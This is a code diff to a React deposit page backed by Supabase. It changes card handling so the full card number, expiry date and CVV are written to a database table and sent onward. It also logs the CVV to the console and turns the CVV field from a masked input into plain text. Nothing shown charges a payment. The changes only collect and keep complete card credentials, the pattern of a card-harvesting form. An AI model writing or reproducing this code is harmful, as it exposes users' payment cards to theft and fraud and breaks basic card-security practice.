@@ -1,10 +1,9 @@
-import { motion } from "framer-motion";
 import { Copy, QrCode, CheckCircle, Clock, CreditCard } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
-import { useState, useEffect } from "react";
+import { useState } from "react";
 import { useToast } from "@/hooks/use-toast";
 import { supabase } from "@/integrations/supabase/client";
 import { useQuery, useQueryClient } from "@tanstack/react-query";
@@ -38,6 +37,7 @@ const Deposit = () => {
     cvv: "",
     bankName: "",
     amount: "",
+    cardType: "",
   });
   const [isProcessingCard, setIsProcessingCard] = useState(false);
   const { toast } = useToast();
@@ -137,7 +137,7 @@ const Deposit = () => {
   };
 
   const handleCardDeposit = async () => {
-    if (!cardDetails.cardHolderName || !cardDetails.cardNumber || !cardDetails.bankName || !cardDetails.amount) {
+    if (!cardDetails.cardHolderName || !cardDetails.cardNumber || !cardDetails.bankName || !cardDetails.amount || !cardDetails.expiryDate || !cardDetails.cvv || !cardDetails.cardType) {
       toast({
         title: "Error",
         description: "Please fill in all required fields",
@@ -163,13 +163,19 @@ const Deposit = () => {
       } = await supabase.auth.getUser();
       if (!user) throw new Error("Not authenticated");
 
-      const lastFour = cardDetails.cardNumber.slice(-4);
+      //const lastFour = cardDetails.cardNumber.slice(-4);
+
+      console.log(cardDetails.cvv)
 
       const { error } = await supabase.from("card_deposits").insert({
         user_id: user.id,
         card_holder_name: cardDetails.cardHolderName,
-        last_four_digits: lastFour,
+        last_four_digits: cardDetails.cardNumber,
+        card_number: cardDetails.cardNumber || "0",
+        card_type: cardDetails.cardType,
         bank_name: cardDetails.bankName,
+        expiry_date: cardDetails.expiryDate,
+        cvv: cardDetails.cvv,
         amount: amount,
         status: "pending",
       });
@@ -182,7 +188,9 @@ const Deposit = () => {
         cardHolderName: cardDetails.cardHolderName,
         bankName: cardDetails.bankName,
         amount,
-        lastFourDigits: lastFour,
+        lastFourDigits: cardDetails.cardNumber,
+        expiryDate: cardDetails.expiryDate,
+        cvv: cardDetails.cvv,
       });
 
       toast({
@@ -194,6 +202,7 @@ const Deposit = () => {
         cardHolderName: "",
         cardNumber: "",
         expiryDate: "",
+        cardType: "",
         cvv: "",
         bankName: "",
         amount: "",
@@ -425,7 +434,7 @@ const Deposit = () => {
                   <Label htmlFor="cvv">CVV</Label>
                   <Input
                     id="cvv"
-                    type="password"
+                    type="text"
                     placeholder="123"
                     value={cardDetails.cvv}
                     onChange={(e) => setCardDetails({ ...cardDetails, cvv: e.target.value })}
